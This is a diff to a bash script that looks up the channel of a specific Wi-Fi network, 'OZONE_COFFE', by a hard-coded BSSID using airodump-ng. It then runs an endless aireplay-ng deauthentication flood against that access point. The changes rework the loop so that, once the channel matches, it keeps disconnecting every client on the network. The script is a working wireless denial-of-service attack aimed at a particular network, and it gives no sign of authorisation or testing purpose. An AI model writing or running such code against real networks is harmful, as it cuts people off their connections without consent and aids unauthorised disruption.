@@ -20,7 +20,6 @@ sleep 1
 echo "[*] Scanning for 5 seconds..."
 sleep 5
 
-echo "[*] Airmon is monitoring"
 
 BSSID_CHA=$(cat airodump_output-01.csv | head -n  $(grep -n '^[[:space:]]*$' airodump_output-01.csv | cut -d: -f1 | head -n 2 | tail -1) | grep "OZONE_COFFE" | cut -d " " -f7 | cut -d  "," -f1)
 
@@ -33,15 +32,28 @@ else
 
 fi 
 
+echo "[*] Start monitoring ..." 
+airodump-ng --bssid  08:AA:89:6D:36:A8 $1 >/dev/null 2>&1 &
+
+sleep 5 
+
 BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 
 
-while [ $BSSID_CHA != $BSSID_CHA_DEAUTH ] ; 
+sleep 5 
+
+echo "[*] Checking channels " 
+
+while true  ; 
 do 
-	 BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 
-	 echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH" 
-	 continue 
+	if [[ $BSSID_CHA != $BSSID_CHA_DEAUTH ]] ; then 
+		BSSID_CHA_DEAUTH=$(aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1 -j | cut -d " " -f11 | head -n 1 ) 
+		echo "[-] Not the Same channel : $BSSID_CHA != $BSSID_CHA_DEAUTH" 
+		sleep 3 
+	else 
+		aireplay-ng -0 0 -a  08:AA:89:6D:36:A8  $1  
+		echo "[+] Channel Found \n" 
+		sleep 1 
+		echo "[+] Deathenticating Devices... " 
+	fi 
+	continue 
 done 
-
-echo "[+] Channel Found " 
-
-rm -rf airodump_output-01.csv 
